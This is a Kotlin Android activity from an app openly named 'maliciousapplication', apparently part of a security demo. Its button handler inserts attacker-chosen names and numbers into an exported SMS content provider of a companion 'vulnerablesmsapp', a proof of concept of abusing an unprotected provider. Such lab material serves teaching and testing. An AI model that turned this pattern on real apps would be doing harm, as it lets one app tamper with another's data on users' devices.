package com.example.maliciousapplication

import android.content.ComponentName
import android.content.ContentValues
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import kotlinx.android.synthetic.main.activity_content_provider.*
import kotlinx.android.synthetic.main.activity_exported_service.*

class ContentProviderActivity : AppCompatActivity(){

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_content_provider)
    }

    fun buttonSendSMSOnClick(view: View) {
        val PROVIDER_NAME = "com.example.vulnerablesmsapp.SMSContentProvider"
        val URL = "content://$PROVIDER_NAME/contacts"
        val name = text_field_name.editText?.text.toString()
        val number = text_field_number.editText?.text.toString()

        val values = ContentValues()
        values.put("name", name)
        values.put("number", number)

        val contentUri = Uri.parse(URL)
        val uri = contentResolver.insert(contentUri, values)
    }

}